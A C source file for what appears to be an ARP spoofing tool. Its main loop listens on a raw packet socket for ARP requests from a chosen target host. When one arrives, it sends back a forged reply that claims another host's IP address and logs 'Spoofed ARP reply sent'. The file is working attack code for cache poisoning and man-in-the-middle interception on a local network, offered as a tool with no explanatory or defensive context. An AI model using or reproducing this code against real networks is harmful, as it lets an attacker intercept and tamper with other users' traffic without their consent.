#include <errno.h>
#include <fcntl.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include "args.h"
#include "arp.h"

bool run(int sfd, mm_args_t *args) {
  long size = 0;
  struct sockaddr_storage fromaddr;
  socklen_t fromlen = 0;
  uint8_t buffer[ARP_PACKET_SIZE];

  while (true) {
    size = recvfrom(sfd, buffer, ARP_PACKET_SIZE, 0,
                    (struct sockaddr *)&fromaddr, &fromlen);

    if (size < 0) {
      fprintf(stderr, "Error reading from socket: %s\n", strerror(errno));
      return false;
    }

    mm_arp_packet_t *p = NULL;
    if (parse_arp_packet(&p, buffer) == false) {
      free_arp_packet(&p);
      continue;
    }

    printf("New ARP packet received\n");

    if (args->verbose) {
      print_arp_packet(p);
    }

    if (p->opcode == ARP_OPCODE_REQUEST &&
        memcmp(p->sender_hardware_address, args->target_mac_address,
               ARP_HARDWARE_ADDRESS_LENGTH) == 0 &&
        p->sender_protocol_address == args->target_ipv4 &&
        p->target_protocol_address == args->source_ipv4) {
      printf("ARP request matches target and source\n");
      mm_arp_packet_t *reply = create_arp_reply(p, args);
      if (reply == NULL) {
        fprintf(stderr, "Error creating ARP reply\n");
      } else {
        printf("Sending ARP reply\n");
        if (send_arp_packet(sfd, fromaddr, fromlen, reply, args->verbose) ==
            false) {
          fprintf(stderr, "Error sending ARP packet: %s\n", strerror(errno));
        } else {
          printf("Spoofed ARP reply sent\n");
        }
      }
      free_arp_packet(&reply);
    } else {
      printf("ARP sender doest not match target\n");
    }

    free_arp_packet(&p);
  }

  return true;
}

int main(int argc, char **argv) {
  mm_args_t *args = init_args();

  if (parse_args(args, argc, argv) == false) {
    cleanup_args(args);
    return EXIT_FAILURE;
  }

  if (args->verbose) {
    print_args(args);
  }

  int sfd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
  if (sfd < 0) {
    fprintf(stderr, "Error creating socket: %s\n", strerror(errno));
    cleanup_args(args);
    return EXIT_FAILURE;
  }

  bool success = run(sfd, args);

  close(sfd);

  cleanup_args(args);

  return success ? EXIT_SUCCESS : EXIT_FAILURE;
}
